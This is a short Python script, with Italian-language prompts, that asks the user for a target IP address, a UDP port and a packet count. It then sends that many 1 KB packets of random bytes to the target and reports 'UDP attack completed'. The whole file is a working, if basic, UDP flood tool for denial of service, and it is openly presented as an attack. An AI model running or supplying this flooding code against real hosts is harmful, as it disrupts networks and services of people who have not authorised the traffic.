import socket
import os

target_ip = input("Inserisci l'IP della macchina target: ")

try:
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
except ValueError:
    print("Errore: Inserisci un numero valido per la porta.")
    exit()

try:
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
except ValueError:
    print("Errore: Inserisci un numero valido per il numero di pacchetti.")
    exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = os.urandom(1024)

print(f"Invio di {num_packets} pacchetti UDP da 1KB a {target_ip}:{target_port}")

for i in range(num_packets):
    sock.sendto(packet, (target_ip, target_port))
    print(f"Pacchetto {i+1} inviato.")

print("Attacco UDP completato.")
